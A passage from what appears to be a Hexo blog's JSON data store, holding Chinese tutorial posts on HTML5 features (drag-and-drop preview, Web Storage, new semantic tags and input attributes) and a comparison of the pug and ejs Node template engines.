function(ev) {\n                ev.stopPropagation();\n                ev.preventDefault();\n                console.log(ev.dataTransfer) var file = ev.dataTransfer.files[0];\n                var reader = new FileReader();\n                if (file.type.substr(0, 5) == &quot;image&quot;) {\n                    reader.onload = function(event) {\n                        dest.style.background = &apos;url(&apos; + event.target.result + &apos;) no-repeat center&apos;;\n                        dest.innerHTML = &quot;&quot;;\n                    };\n                    reader.readAsDataURL(file);\n                } else if (file.type.substr(0, 4) == &quot;text&quot;) {\n                    reader.readAsText(file);\n                    reader.onload = function(f) {\n                        dest.innerHTML = &quot;&lt;pre&gt;&quot; + this.result + &quot;&lt;/pre&gt;&quot;;\n                        dest.style.background = &quot;white&quot;;\n                    }\n                } else {\n                    dest.innerHTML = &quot;暂不支持此类文件的预览&quot;;\n                    dest.style.background = &quot;white&quot;;\n                }\n            },\n           false);\n    } \n    //设置页面属性，不执行默认处理（拒绝被拖放）\n    // document.ondragover = function(e) {\n    //     e.preventDefault();\n    // };\n    // document.ondrop = function(e) {\n    //     e.preventDefault();\n    // }\n    // window.onload = init;\n\n  &lt;/script&gt;\n &lt;/head&gt;\n &lt;body&gt; \n  &lt;h1&gt;HTML5文件拖拽预览Demo&lt;/h1&gt; \n  &lt;div id=&quot;show&quot;&gt;\n    文件预览区，仅限图片和txt文件 \n  &lt;/div&gt;\n &lt;/body&gt;\n&lt;/html&gt;\n</code></pre><h2 id=\"Web存储\"><a href=\"#Web存储\" class=\"headerlink\" title=\"Web存储\"></a>Web存储</h2><p>HTML5 提供了两种在客户端存储数据的新方法：</p>\n<ul>\n<li>localStorage - 没有时间限制的数据存储</li>\n<li>sessionStorage - 针对一个 session 的数据存储</li>\n</ul>\n<p>之前，这些都是由 cookie 完成的。但是 cookie 不适合大量数据的存储，因为它们由每个对服务器的请求来传递，这使得 cookie 速度很慢而且效率也不高。</p>\n<p>在 HTML5 中，数据不是由每个服务器请求传递的，而是只有在请求时使用数据。它使在不影响网站性能的情况下存储大量数据成为可能。<br>对于不同的网站，数据存储于不同的区域，并且一个网站只能访问其自身的数据。<br>HTML5 使用 JavaScript 来存储和访问数据。</p>\n<h4 id=\"localStorage方法\"><a href=\"#localStorage方法\" class=\"headerlink\" title=\"localStorage方法\"></a>localStorage方法</h4><p>localStorage 方法存储的数据没有时间限制。第二天、第二周或下一年之后，数据依然可用。</p>\n<p>这个例子创建并访问了 localStorage：</p>\n<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;\n    localStorage.lastname=&quot;Smith&quot;;\n    document.write(localStorage.lastname);\n&lt;/script&gt;\n</code></pre><p>下面的例子对用户访问页面的次数进行计数：</p>\n<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;\n    if (localStorage.pagecount) {\n          localStorage.pagecount=Number(localStorage.pagecount) +1;\n    }\n    else {\n         localStorage.pagecount=1;\n    }\n    document.write(&quot;Visits &quot;+ localStorage.pagecount + &quot; time(s).&quot;);\n&lt;/script&gt;\n</code></pre><h4 id=\"sessionStorage方法\"><a href=\"#sessionStorage方法\" class=\"headerlink\" title=\"sessionStorage方法\"></a>sessionStorage方法</h4><p>sessionStorage 方法针对一个 session 进行数据存储。当用户关闭浏览器窗口后，数据会被删除。</p>\n<p>创建并访问一个 sessionStorage：</p>\n<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;\n    sessionStorage.lastname=&quot;Smith&quot;;\n    document.write(sessionStorage.lastname);\n&lt;/script&gt;\n</code></pre><p>应用——统计用户在当前 session 中访问页面的次数进行计数：</p>\n<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;\n    if (sessionStorage.pagecount) {\n          sessionStorage.pagecount=Number(sessionStorage.pagecount) +1;\n    }\n    else {\n         sessionStorage.pagecount=1;\n    }\n    document.write(&quot;Visits &quot;+sessionStorage.pagecount+&quot; time(s) this session.&quot;);\n&lt;/script&gt;\n</code></pre><h2 id=\"H5标签\"><a href=\"#H5标签\" class=\"headerlink\" title=\"H5标签\"></a>H5标签</h2><h3 id=\"nav标签\"><a href=\"#nav标签\" class=\"headerlink\" title=\"nav标签\"></a>nav标签</h3><pre><code>&lt;nav&gt;\n    &lt;a href=&quot;index.asp&quot;&gt;Home&lt;/a&gt;\n    &lt;a href=&quot;html5_meter.asp&quot;&gt;Previous&lt;/a&gt;\n    &lt;a href=&quot;html5_noscript.asp&quot;&gt;Next&lt;/a&gt;\n&lt;/nav&gt;\n</code></pre><h5 id=\"定义和用法\"><a href=\"#定义和用法\" class=\"headerlink\" title=\"定义和用法\"></a>定义和用法</h5><p><code>&lt;nav&gt;</code>定义导航链接的部分。</p>\n<blockquote>\n<p>如果文档中有“前后”按钮，则应该把它放到 <code>&lt;nav&gt;</code> 元素中。</p>\n</blockquote>\n<h3 id=\"section标签\"><a href=\"#section标签\" class=\"headerlink\" title=\"section标签\"></a>section标签</h3><pre><code>&lt;section&gt;\n  &lt;h1&gt;PRC&lt;/h1&gt;\n  &lt;p&gt;The People&apos;s Republic of China was born in 1949...&lt;/p&gt;\n&lt;/section&gt;\n</code></pre><h5 id=\"定义和用法-1\"><a href=\"#定义和用法-1\" class=\"headerlink\" title=\"定义和用法\"></a>定义和用法</h5><p><code>&lt;section&gt;</code> 标签定义文档中的节（section、区段）。比如章节、页眉、页脚或文档中的其他部分。</p>\n<h3 id=\"header标签\"><a href=\"#header标签\" class=\"headerlink\" title=\"header标签\"></a>header标签</h3><pre><code>&lt;header&gt;\n    &lt;h1&gt;Welcome to my homepage&lt;/h1&gt;\n    &lt;p&gt;My name is Donald Duck&lt;/p&gt;\n&lt;/header&gt;\n\n&lt;p&gt;The rest of my home page...&lt;/p&gt;\n</code></pre><h5 id=\"定义和用法-2\"><a href=\"#定义和用法-2\" class=\"headerlink\" title=\"定义和用法\"></a>定义和用法</h5><p><code>&lt;header&gt;</code>定义 section 或 page 的页眉（介绍信息）。</p>\n<h3 id=\"footer标签\"><a href=\"#footer标签\" class=\"headerlink\" title=\"footer标签\"></a>footer标签</h3><pre><code>&lt;footer&gt;\n      &lt;p&gt;Posted by: Ajun&lt;/p&gt;\n      &lt;p&gt;Contact information: &lt;a href=&quot;mailto:774271383@qq.com&quot;&gt;774271383@qq.com&lt;/a&gt;.&lt;/p&gt;\n&lt;/footer&gt;\n</code></pre><h5 id=\"定义和用法-3\"><a href=\"#定义和用法-3\" class=\"headerlink\" title=\"定义和用法\"></a>定义和用法</h5><p><code>&lt;footer&gt;</code> 标签定义文档或节的页脚。</p>\n<p>页脚通常包含文档的作者、版权信息、使用条款链接、联系信息等等。<br>一个文档中可以使用多个 <code>&lt;footer&gt;</code> 元素。</p>\n<blockquote>\n<p><code>&lt;footer&gt;</code> 元素内的联系信息应该位于 <code>&lt;address&gt;</code> 标签中。</p>\n</blockquote>\n<h3 id=\"output标签\"><a href=\"#output标签\" class=\"headerlink\" title=\"output标签\"></a>output标签</h3><pre><code>&lt;form oninput=&quot;x.value=parseInt(a.value)+parseInt(b.value)&quot;&gt;0\n       &lt;input type=&quot;range&quot; id=&quot;a&quot; value=&quot;50&quot;&gt;100+&lt;input type=&quot;number&quot; id=&quot;b&quot; value=&quot;50&quot;&gt;\n       =&lt;output name=&quot;x&quot; for=&quot;a b&quot;&gt;100&lt;/output&gt;\n&lt;/form&gt; \n</code></pre><h5 id=\"定义和用法-4\"><a href=\"#定义和用法-4\" class=\"headerlink\" title=\"定义和用法\"></a>定义和用法</h5><p><code>&lt;output&gt;</code>定义不同类型的输出，比如脚本的输出。</p>\n<table>\n<thead>\n<tr>\n<th>属性</th>\n<th>值</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>for</td>\n<td>element_id</td>\n<td>定义输出域相关的一个或多个元素。</td>\n</tr>\n<tr>\n<td>form</td>\n<td>form_id</td>\n<td>定义输入字段所属的一个或多个表单。</td>\n</tr>\n<tr>\n<td>name</td>\n<td>name</td>\n<td>定义对象的唯一名称。（表单提交时使用）</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"progress标签\"><a href=\"#progress标签\" class=\"headerlink\" title=\"progress标签\"></a>progress标签</h3><pre><code>&lt;progress value=&quot;22&quot; max=&quot;100&quot;&gt;&lt;/progress&gt; \n</code></pre><h5 id=\"浏览器支持-1\"><a href=\"#浏览器支持-1\" class=\"headerlink\" title=\"浏览器支持\"></a>浏览器支持</h5><p>Internet Explorer 9 以及更早的版本不支持 <code>&lt;progress&gt;</code> 标签。</p>\n<h5 id=\"定义和用法-5\"><a href=\"#定义和用法-5\" class=\"headerlink\" title=\"定义和用法\"></a>定义和用法</h5><p><code>&lt;progress&gt;</code> 标签标示任务的进度（进程）。</p>\n<blockquote>\n<p>结合<code>&lt;progress&gt;</code>标签与 JavaScript 一同使用，来显示任务的进度。<br>注意不适合用来表示度量衡（例如，磁盘空间使用情况或查询结果）。如需表示度量衡，请使用 <code>&lt;meter&gt;</code> 标签代替。</p>\n</blockquote>\n<h3 id=\"article标签\"><a href=\"#article标签\" class=\"headerlink\" title=\"article标签\"></a>article标签</h3><pre><code>&lt;article&gt;\n      &lt;h1&gt;Internet Explorer 9&lt;/h1&gt;\n      &lt;p&gt;Windows Internet Explorer 9（简称 IE9）于2011年3月14日发布。&lt;/p&gt;\n&lt;/article&gt;\n</code></pre><h5 id=\"定义和用法-6\"><a href=\"#定义和用法-6\" class=\"headerlink\" title=\"定义和用法\"></a>定义和用法</h5><p><code>&lt;article&gt;</code> 标签规定独立的自包含内容。一篇文章应有其自身的意义，应该有可能独立于站点的其余部分对其进行分发。</p>\n<p><code>&lt;article&gt;</code> 元素的潜在来源：</p>\n<ul>\n<li>论坛帖子</li>\n<li>报纸文章</li>\n<li>博客条目</li>\n<li>用户评论</li>\n</ul>\n<h3 id=\"aside标签\"><a href=\"#aside标签\" class=\"headerlink\" title=\"aside标签\"></a>aside标签</h3><pre><code>&lt;p&gt;Me and my family visited The Epcot center this summer.&lt;/p&gt;\n&lt;aside&gt;\n    &lt;h4&gt;Epcot Center&lt;/h4&gt;\n    The Epcot Center is a theme park in Disney World, Florida.\n&lt;/aside&gt;\n</code></pre><h5 id=\"定义和用法-7\"><a href=\"#定义和用法-7\" class=\"headerlink\" title=\"定义和用法\"></a>定义和用法</h5><p><code>&lt;aside&gt;</code>标签定义其所处内容之外的内容。aside的内容应该与附近的内容相关。</p>\n<h3 id=\"bdi标签\"><a href=\"#bdi标签\" class=\"headerlink\" title=\"bdi标签\"></a>bdi标签</h3><pre><code>&lt;ul&gt;\n    &lt;li&gt;Username &lt;bdi&gt;Bill&lt;/bdi&gt;:80 points&lt;/li&gt;\n    &lt;li&gt;Username &lt;bdi&gt;Steve&lt;/bdi&gt;: 78 points&lt;/li&gt;\n&lt;/ul&gt;\n</code></pre><h5 id=\"定义和用法-8\"><a href=\"#定义和用法-8\" class=\"headerlink\" title=\"定义和用法\"></a>定义和用法</h5><p>bdi 指的是 bidi 隔离。</p>\n<p><code>&lt;bdi&gt;</code> 标签允许您设置一段文本，使其脱离其父元素的文本方向设置。在发布用户评论或其他您无法完全控制的内容时，该标签很有用。</p>\n<h3 id=\"command标签\"><a href=\"#command标签\" class=\"headerlink\" title=\"command标签\"></a>command标签</h3><pre><code>&lt;menu&gt;\n    &lt;command onclick=&quot;alert(&apos;Hello World&apos;)&quot;&gt;Click Me!&lt;/command&gt;\n&lt;/menu&gt;\n</code></pre><h5 id=\"浏览器支持-2\"><a href=\"#浏览器支持-2\" class=\"headerlink\" title=\"浏览器支持\"></a>浏览器支持</h5><p>目前只有 Internet Explorer 支持 <code>&lt;command&gt;</code> 标签。(自己测试怎么IE也不行)</p>\n<h5 id=\"定义和用法-9\"><a href=\"#定义和用法-9\" class=\"headerlink\" title=\"定义和用法\"></a>定义和用法</h5><p>command 元素表示用户能够调用的命令。可以定义命令按钮，比如单选按钮、复选框或按钮。</p>\n<p>只有当 command 元素位于 menu 元素内时，该元素才是可见的。否则不会显示这个元素，但是可以用它规定键盘快捷键。</p>\n<table>\n<thead>\n<tr>\n<th>属性</th>\n<th>值</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>checked</td>\n<td>checked</td>\n<td>定义是否被选中。仅用于 radio 或 checkbox 类型。</td>\n</tr>\n<tr>\n<td>disabled</td>\n<td>disabled</td>\n<td>定义 command 是否可用。</td>\n</tr>\n<tr>\n<td>icon</td>\n<td>url</td>\n<td>定义作为 command 来显示的图像的 url。</td>\n</tr>\n<tr>\n<td>label</td>\n<td>text</td>\n<td>为 command 定义可见的 label。</td>\n</tr>\n<tr>\n<td>radiogroup</td>\n<td>groupname</td>\n<td>定义 command 所属的组名。仅在类型为 radio 时使用。</td>\n</tr>\n<tr>\n<td>type</td>\n<td>checkbox<br>command<br>radio</td>\n<td>定义该 command 的类型。默认是 “command”。</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"datalist标签\"><a href=\"#datalist标签\" class=\"headerlink\" title=\"datalist标签\"></a>datalist标签</h3><pre><code>&lt;input id=&quot;myCar&quot; list=&quot;cars&quot; /&gt;\n&lt;datalist id=&quot;cars&quot;&gt;\n  &lt;option value=&quot;BMW&quot;&gt;宝马&lt;/option&gt;\n  &lt;option value=&quot;Ford&quot;&gt;福特&lt;/option&gt;\n  &lt;option value=&quot;Volvo&quot;&gt;沃尔沃&lt;/option&gt;\n&lt;/datalist&gt;\n</code></pre><h5 id=\"定义和用法-10\"><a href=\"#定义和用法-10\" class=\"headerlink\" title=\"定义和用法\"></a>定义和用法</h5><p><code>&lt;datalist&gt;</code>标签定义下拉选项列表。请与 input 元素配合使用该元素，来定义 input 可能的值。</p>\n<p>datalist 及其选项不会被显示出来，它仅仅是合法的输入值列表。</p>\n<blockquote>\n<ul>\n<li>请使用 input 元素的 list 属性来绑定 datalist。<ul>\n<li>注意value属性值为选项内容，option标签内为当前选项内容的注释。</li>\n<li>区别与select标签的区分，输入方式也有所不同。</li>\n</ul>\n</li>\n</ul>\n</blockquote>\n<h3 id=\"details标签\"><a href=\"#details标签\" class=\"headerlink\" title=\"details标签\"></a>details标签</h3><pre><code>&lt;details&gt;\n    &lt;summary&gt;Copyright 2011.&lt;/summary&gt;\n    &lt;p&gt;All pages and graphics on this web site are the property of W3School.&lt;/p&gt;\n&lt;/details&gt;\n</code></pre><blockquote>\n<p>与<code>&lt;summary&gt;</code>标签配合使用可以为details定义标题。标题是可见的，用户点击标题时，会显示出 details。若不定义summary则标题显示详细信息。</p>\n</blockquote>\n<h5 id=\"定义和用法-11\"><a href=\"#定义和用法-11\" class=\"headerlink\" title=\"定义和用法\"></a>定义和用法</h5><p>定义元素的细节，用于描述文档或文档某个部分的细节。</p>\n<h5 id=\"浏览器支持-3\"><a href=\"#浏览器支持-3\" class=\"headerlink\" title=\"浏览器支持\"></a>浏览器支持</h5><p>目前只有 Chrome 支持 <code>&lt;details&gt;</code> 标签。其他浏览器不识别但是会使用衬线体来直接显示其内所有内容。</p>\n<h5 id=\"属性\"><a href=\"#属性\" class=\"headerlink\" title=\"属性\"></a>属性</h5><p>open属性，只有一个值“open”，定义 details 内的内容默认可见。</p>\n<h3 id=\"dialog标签\"><a href=\"#dialog标签\" class=\"headerlink\" title=\"dialog标签\"></a>dialog标签</h3><pre><code>&lt;table border=&quot;1&quot;&gt;\n&lt;tr&gt;\n  &lt;th&gt;一月 &lt;dialog open&gt;这是打开的对话窗口&lt;/dialog&gt;&lt;/th&gt;\n  &lt;th&gt;二月&lt;/th&gt;\n  &lt;th&gt;三月&lt;/th&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n  &lt;td&gt;31&lt;/td&gt;\n  &lt;td&gt;28&lt;/td&gt;\n  &lt;td&gt;31&lt;/td&gt;\n&lt;/tr&gt;\n&lt;/table&gt;\n</code></pre><h5 id=\"定义和用法-12\"><a href=\"#定义和用法-12\" class=\"headerlink\" title=\"定义和用法\"></a>定义和用法</h5><p>定义对话框或窗口。</p>\n<h5 id=\"属性-1\"><a href=\"#属性-1\" class=\"headerlink\" title=\"属性\"></a>属性</h5><p>open属性，只有一个值“open”，规定 dialog 元素是活动的，用户可与之交互。</p>\n<h5 id=\"浏览器支持-4\"><a href=\"#浏览器支持-4\" class=\"headerlink\" title=\"浏览器支持\"></a>浏览器支持</h5><p>目前只有 Chrome 和 Safari 6 支持 <dialog> 标签。</p>\n<h3 id=\"embed标签\"><a href=\"#embed标签\" class=\"headerlink\" title=\"embed标签\"></a>embed标签</h3><pre><code>&lt;embed src=&quot;helloworld.swf&quot; /&gt;\n</code></pre><h5 id=\"定义和用法-13\"><a href=\"#定义和用法-13\" class=\"headerlink\" title=\"定义和用法\"></a>定义和用法</h5><p>定义嵌入的内容，可以用来插入各种多媒体，格式可以是Swf、Midi、Wav、AIFF、AU、MP3等等。</p>\n<table>\n<thead>\n<tr>\n<th>属性</th>\n<th>值</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>height</td>\n<td>pixels</td>\n<td>设置嵌入内容的高度。</td>\n</tr>\n<tr>\n<td>src</td>\n<td>url</td>\n<td>嵌入内容的 URL。</td>\n</tr>\n<tr>\n<td>type</td>\n<td>type</td>\n<td>定义嵌入内容的类型。</td>\n</tr>\n<tr>\n<td>width</td>\n<td>pixels</td>\n<td>设置嵌入内容的宽度。</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"figure标签\"><a href=\"#figure标签\" class=\"headerlink\" title=\"figure标签\"></a>figure标签</h3><pre><code>&lt;figure&gt;\n  &lt;p&gt;黄浦江上的的卢浦大桥&lt;/p&gt;\n  &lt;img src=&quot;shanghai_lupu_bridge.jpg&quot; width=&quot;350&quot; height=&quot;234&quot; /&gt;\n&lt;/figure&gt;\n</code></pre><h5 id=\"定义和用法-14\"><a href=\"#定义和用法-14\" class=\"headerlink\" title=\"定义和用法\"></a>定义和用法</h5><p><code>&lt;figure&gt;</code> 标签规定独立的流内容（图像、图表、照片、代码等等）,定义媒介内容的分组，以及它们的标题。其内容应该与主内容相关，但如果被删除，则不应对文档流产生影响。</p>\n<blockquote>\n<p>使用 <code>&lt;figcaption&gt;</code> 元素为 figure 添加标题（caption）。</p>\n</blockquote>\n<h3 id=\"input标签\"><a href=\"#input标签\" class=\"headerlink\" title=\"input标签\"></a>input标签</h3><p>H5新增许多其属性，列表如下</p>\n<table>\n<thead>\n<tr>\n<th>属性</th>\n<th>值</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>accept</td>\n<td>mime_type</td>\n<td>规定通过文件上传来提交的文件的类型。</td>\n</tr>\n<tr>\n<td>align</td>\n<td>left<br>right<br>top<br>middle<br>bottom</td>\n<td>不赞成使用。规定图像输入的对齐方式。</td>\n</tr>\n<tr>\n<td>alt</td>\n<td>text</td>\n<td>定义图像输入的替代文本。</td>\n</tr>\n<tr>\n<td>autocomplete</td>\n<td>on<br>off</td>\n<td>规定是否使用输入字段的自动完成功能。</td>\n</tr>\n<tr>\n<td>autofocus</td>\n<td>autofocus</td>\n<td>规定输入字段在页面加载时是否获得焦点。（不适用于 type=”hidden”）</td>\n</tr>\n<tr>\n<td>checked</td>\n<td>checked</td>\n<td>规定此 input 元素首次加载时应当被选中。</td>\n</tr>\n<tr>\n<td>disabled</td>\n<td>disabled</td>\n<td>当 input 元素加载时禁用此元素。</td>\n</tr>\n<tr>\n<td>form</td>\n<td>formname</td>\n<td>规定输入字段所属的一个或多个表单。</td>\n</tr>\n<tr>\n<td>formaction</td>\n<td>URL</td>\n<td>覆盖表单的 action 属性。（适用于 type=”submit” 和 type=”image”）</td>\n</tr>\n<tr>\n<td>formenctype</td>\n<td>见注释</td>\n<td>覆盖表单的 enctype 属性。（适用于 type=”submit” 和 type=”image”）</td>\n</tr>\n<tr>\n<td>formmethod</td>\n<td>get<br>post</td>\n<td>覆盖表单的 method 属性。（适用于 type=”submit” 和 type=”image”）</td>\n</tr>\n<tr>\n<td>formnovalidate</td>\n<td>formnovalidate</td>\n<td>覆盖表单的 novalidate 属性。如果使用该属性，则提交表单时不进行验证。</td>\n</tr>\n<tr>\n<td>formtarget</td>\n<td>_blank<br>_self<br>_parent<br>_top<br>framename</td>\n<td>覆盖表单的 target 属性。（适用于 type=”submit” 和 type=”image”）</td>\n</tr>\n<tr>\n<td>height</td>\n<td>pixels<br>%</td>\n<td>定义 input 字段的高度。（适用于 type=”image”）</td>\n</tr>\n<tr>\n<td>list</td>\n<td>datalist-id</td>\n<td>引用包含输入字段的预定义选项的 datalist 。</td>\n</tr>\n<tr>\n<td>max</td>\n<td>number<br>date</td>\n<td>规定输入字段的最大值。请与 “min” 属性配合使用，来创建合法值的范围。</td>\n</tr>\n<tr>\n<td>maxlength</td>\n<td>number</td>\n<td>规定输入字段中的字符的最大长度。</td>\n</tr>\n<tr>\n<td>min</td>\n<td>number<br>date</td>\n<td>规定输入字段的最小值。请与 “max” 属性配合使用，来创建合法值的范围。</td>\n</tr>\n<tr>\n<td>multiple</td>\n<td>multiple</td>\n<td>如果使用该属性，则允许一个以上的值。</td>\n</tr>\n<tr>\n<td>name</td>\n<td>field_name</td>\n<td>定义 input 元素的名称。</td>\n</tr>\n<tr>\n<td>pattern</td>\n<td>regexp_pattern</td>\n<td>规定输入字段的值的模式或格式。例如 pattern=”[0-9]” 表示输入值必须是 0 与 9 之间的数字。</td>\n</tr>\n<tr>\n<td>placeholder</td>\n<td>text</td>\n<td>规定帮助用户填写输入字段的提示。</td>\n</tr>\n<tr>\n<td>readonly</td>\n<td>readonly</td>\n<td>规定输入字段为只读。</td>\n</tr>\n<tr>\n<td>required</td>\n<td>required</td>\n<td>指示输入字段的值是必需的。</td>\n</tr>\n<tr>\n<td>size</td>\n<td>number_of_char</td>\n<td>定义输入字段的宽度。</td>\n</tr>\n<tr>\n<td>src</td>\n<td>URL</td>\n<td>定义以提交按钮形式显示的图像的 URL。</td>\n</tr>\n<tr>\n<td>step</td>\n<td>number</td>\n<td>规定输入字的的合法数字间隔。</td>\n</tr>\n<tr>\n<td>type</td>\n<td>button<br>checkbox<br>file<br>hidden<br>image<br>password<br>radio<br>reset<br>submit<br>text</td>\n<td>规定 input 元素的类型。</td>\n</tr>\n<tr>\n<td>value</td>\n<td>value</td>\n<td>规定 input 元素的值。</td>\n</tr>\n<tr>\n<td>width</td>\n<td>pixels<br>%</td>\n<td>定义 input 字段的宽度。（适用于 type=”image”）</td>\n</tr>\n</tbody>\n</table>"},{"title":"node模板引擎——pug(jade)","_content":"\n> 最近发掘了一个个人项目，初上手Node构建web应用。之前大概学了学好久了也都忘了，这次趁着这个项目好好熟悉熟悉，练练手。首先从模板引擎开始吧。\n\n<!-- more -->\n\n## 前言\n\n`jade`和`pug`是一个东西，以前叫`jade`后来因为商标问题改名`pug`。\n\n## 和ejs比较\n\n网上有流传过一个万行测试(当时还叫Jade)，让两者和另一个模板引擎，`Handlebars`解释万行html代码，最后的效率（花费时间）是\n\nJade 287ms > ejs 43ms > Handlebars 28ms\n\n> Jade 因为采用了类似 zen coding 的语法，比较新奇，但效率极其低下。\n\n但是，`pug`就其强制缩进而优雅简洁。`ejs`更传统，于是在大量数据代码结构下页面的结构容易显得混乱。\n\n另外看了知乎贺老的回答，发觉`pug`一个超棒的点\n\n> 换行处理，避免产生额外的空白节点\n\n不知道大家怎么想，反正我老是因为莫名其妙的空白节点困扰，尤其是css样式的时候，其实也知道怎么解决，比如根节点`font-size: 0`之类的，但是主要是容易和其他样式造成的莫名空隙搞混，不知道到底是哪个原因，就会多一步确认和调试步骤\n\n贺老还讲了很多，具体看文末的参考链接。\n\n但是我觉得吧，因为`pug`的简洁语法，导致会有点上手难度，不像ejs，简直就是个`jsp`，一眼就看懂了，但是`pug`要是没专门学习过还真看不太懂，更别说自己写了。\n\n## jade语法\n\n**缩进**，**缩进**，**再缩进**\n\n> 就笼统地总结一下吧,详细可以看一下参考链接。\n\n1. 不用尖括号，使用 **缩进**\n2. 每个换行的第一个单词会被解释为一个标签(无论HTML有没有这个标签)\n3. 标签的属性名使用括号包起来，并且属性之间用逗号间隔`(ATTRNAME1=ATTRVALUE1, ATTRNAME2=ATTRVALUE2)`。特别的，`id`和`class`可以用像`emmet`的语法: `TAGNAME#IDNAME.CLASSNAME`，然后再跟括号包裹其他属性\n4. 使用`!{}` `#{}` `= ` `!= `来渲染后台数据，其中，用`!`的这一系列可以解释后天数据中的尖括号标签，而其他会把尖括号当成字符串渲染，感觉也是安全考虑\n5. 服务端代码用`- `开头，比如`if`判断和`for`循环等\n6. 可以重用`jade`块(`Mixin`声明一个块，然后用`+BLOCKNAME()`调用)\n7. 模板继承，`extends DIRNAME`\n\n****\n参考链接\n* [Web 模板 Jade、EJS、Handlebars 万行代码解释效率比较，Jade 完败](http://cnodejs.org/topic/50e70edfa7e6c6171a1d70fa)\n* [【知乎】关于nodejs的模板引擎，如何选择 EJS 和 Jade?](https://www.zhihu.com/question/20355486?sort=created)\n* [ Jade 模板引擎使用](http://cnodejs.org/topic/5368adc5cf738dd6090060f2)","source":"_posts/node模板引擎--pug.md","raw":"---\n\ntitle: node模板引擎——pug(jade)\ntags: ['node', 'html', 'pug' , '模板引擎']\n\n---\n\n> 最近发掘了一个个人项目，初上手Node构建web应用。之前大概学了学好久了也都忘了，这次趁着这个项目好好熟悉熟悉，练练手。首先从模板引擎开始吧。\n\n<!-- more -->\n\n## 前言\n\n`jade`和`pug`是一个东西，以前叫`jade`后来因为商标问题改名`pug`。\n\n## 和ejs比较\n\n网上有流传过一个万行测试(当时还叫Jade)，让两者和另一个模板引擎，`Handlebars`解释万行html代码，最后的效率（花费时间）是\n\nJade 287ms > ejs 43ms > Handlebars 28ms\n\n> Jade 因为采用了类似 zen coding 的语法，比较新奇，但效率极其低下。\n\n但是，`pug`就其强制缩进而优雅简洁。`ejs`更传统，于是在大量数据代码结构下页面的结构容易显得混乱。\n\n另外看了知乎贺老的回答，发觉`pug`一个超棒的点\n\n> 换行处理，避免产生额外的空白节点\n\n不知道大家怎么想，反正我老是因为莫名其妙的空白节点困扰，尤其是css样式的时候，其实也知道怎么解决，比如根节点`font-size: 0`之类的，但是主要是容易和其他样式造成的莫名空隙搞混，不知道到底是哪个原因，就会多一步确认和调试步骤\n\n贺老还讲了很多，具体看文末的参考链接。\n\n但是我觉得吧，因为`pug`的简洁语法，导致会有点上手难度，不像ejs，简直就是个`jsp`，一眼就看懂了，但是`pug`要是没专门学习过还真看不太懂，更别说自己写了。\n\n## jade语法\n\n**缩进**，**缩进**，**再缩进**\n\n> 就笼统地总结一下吧,详细可以看一下参考链接。\n\n1. 不用尖括号，使用 **缩进**\n2. 每个换行的第一个单词会被解释为一个标签(无论HTML有没有这个标签)\n3. 标签的属性名使用括号包起来，并且属性之间用逗号间隔`(ATTRNAME1=ATTRVALUE1, ATTRNAME2=ATTRVALUE2)`。特别的，`id`和`class`可以用像`emmet`的语法: `TAGNAME#IDNAME.CLASSNAME`，然后再跟括号包裹其他属性\n4. 使用`!{}` `#{}` `= ` `!= `来渲染后台数据，其中，用`!`的这一系列可以解释后天数据中的尖括号标签，而其他会把尖括号当成字符串渲染，感觉也是安全考虑\n5. 服务端代码用`- `开头，比如`if`判断和`for`循环等\n6. 可以重用`jade`块(`Mixin`声明一个块，然后用`+BLOCKNAME()`调用)\n7. 模板继承，`extends DIRNAME`\n\n****\n参考链接\n* [Web 模板 Jade、EJS、Handlebars 万行代码解释效率比较，Jade 完败](http://cnodejs.org/topic/50e70edfa7e6c6171a1d70fa)\n* [【知乎】关于nodejs的模板引擎，如何选择 EJS 和 Jade?](https://www.zhihu.com/question/20355486?sort=created)\n* [ Jade 模板引擎使用](http://cnodejs.org/topic/5368adc5cf738dd6090060f2)","slug":"node模板引擎--pug","published":1,"date":"2017-05-01T02:42:35.548Z","updated":"2017-05-01T03:13:49.800Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9ft3s3u0007l8sl1lkrq6xn","content":"<blockquote>\n<p>最近发掘了一个个人项目，初上手Node构建web应用。之前大概学了学好久了也都忘了，这次趁着这个项目好好熟悉熟悉，练练手。首先从模板引擎开始吧。</p>\n</blockquote>\n<a id=\"more\"></a>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p><code>jade</code>和<code>pug</code>是一个东西，以前叫<code>jade</code>后来因为商标问题改名<code>pug</code>。</p>\n<h2 id=\"和ejs比较\"><a href=\"#和ejs比较\" class=\"headerlink\" title=\"和ejs比较\"></a>和ejs比较</h2><p>网上有流传过一个万行测试(当时还叫Jade)，让两者和另一个模板引擎，<code>Handlebars</code>解释万行html代码，最后的效率（花费时间）是</p>\n<p>Jade 287ms &gt; ejs 43ms &gt; Handlebars 28ms</p>\n<blockquote>\n<p>Jade 因为采用了类似 zen coding 的语法，比较新奇，但效率极其低下。</p>\n</blockquote>\n<p>但是，<code>pug</code>就其强制缩进而优雅简洁。<code>ejs</code>更传统，于是在大量数据代码结构下页面的结构容易显得混乱。</p>\n<p>另外看了知乎贺老的回答，发觉<code>pug</code>一个超棒的点</p>\n<blockquote>\n<p>换行处理，避免产生额外的空白节点</p>\n</blockquote>\n<p>不知道大家怎么想，反正我老是因为莫名其妙的空白节点困扰，尤其是css样式的时候，其实也知道怎么解决，比如根节点<code>font-size: 0</code>之类的，但是主要是容易和其他样式造成的莫名空隙搞混，不知道到底是哪个原因，就会多一步确认和调试步骤</p>\n<p>贺老还讲了很多，具体看文末的参考链接。</p>\n<p>但是我觉得吧，因为<code>pug</code>的简洁语法，导致会有点上手难度，不像ejs，简直就是个<code>jsp</code>，一眼就看懂了，但是<code>pug</code>要是没专门学习过还真看不太懂，更别说自己写了。</p>\n<h2 id=\"jade语法\"><a href=\"#jade语法\" class=\"headerlink\" 